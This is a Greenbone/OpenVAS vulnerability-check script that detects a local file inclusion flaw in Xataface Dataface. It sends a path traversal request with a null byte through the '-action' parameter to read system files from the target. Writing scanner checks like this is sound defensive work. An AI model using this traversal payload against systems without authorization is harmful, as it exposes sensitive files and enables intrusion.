# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801950");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2011-06-13 15:28:04 +0200 (Mon, 13 Jun 2011)");
  script_tag(name:"cvss_base", value:"6.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:P/I:P/A:P");
  script_name("Xataface Dataface '-action' Local File Inclusion Vulnerability");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17367/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/48126");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/102056/dataface-lfi.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to obtain potentially
  sensitive information and to execute arbitrary local scripts in the context of the web server process.");

  script_tag(name:"affected", value:"Xataface Dataface version 1.3rc3 and prior.");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input
  via the '-action' parameter to 'index.php', which allows attackers to read arbitrary
  files via a ../(dot dot) sequences.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Xataface Dataface is prone to local file inclusion vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");
include("os_func.inc");

port = http_get_port(default:80);
if (!http_can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list_unique("/Xdataface", "/dataface", "/", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  res = http_get_cache(item: dir + "/dataface_info.php", port:port);
  if('>INSTALLED CORRECTLY </' >< res && 'Xataface Web Application Framework<' >< res)
  {
    files = traversal_files();

    foreach file (keys(files))
    {
      url = string(dir, "/index.php?-action=../../../../../../../",
                       files[file],'%00');
      if(http_vuln_check(port:port, url:url, pattern:file))
      {
        report = http_report_vuln_url(port:port, url:url);
        security_message(port:port, data:report);
        exit(0);
      }
    }
  }
}

exit(99);
